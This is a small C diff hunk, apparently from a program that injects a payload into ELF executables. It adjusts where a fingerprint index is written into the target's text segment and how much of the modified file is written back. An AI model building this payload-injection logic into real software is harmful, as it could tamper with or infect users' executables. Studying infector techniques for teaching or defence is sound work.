@@ -13,8 +13,8 @@ static int	update_index(t_fingerprint *fingerprint, t_info *info)
 	program_header->p_memsz -= PAYLOAD_SIZE + BIS_SIZE;
 	program_header->p_filesz = program_header->p_memsz;
 
-	ft_memcpy(info->text_begin + info->text_size - 5, &(fingerprint->index), 4);
-	ft_syswrite(info->fd, info->file, info->file_size);
+	ft_memcpy(info->text_begin + info->text_size - SIGN_SIZE - 8 - 5, &(fingerprint->index), 4);
+	ft_syswrite(info->fd, info->file, info->file_size - info->bss_size - (PAYLOAD_SIZE + BIS_SIZE));
 	return(1);
 }
 
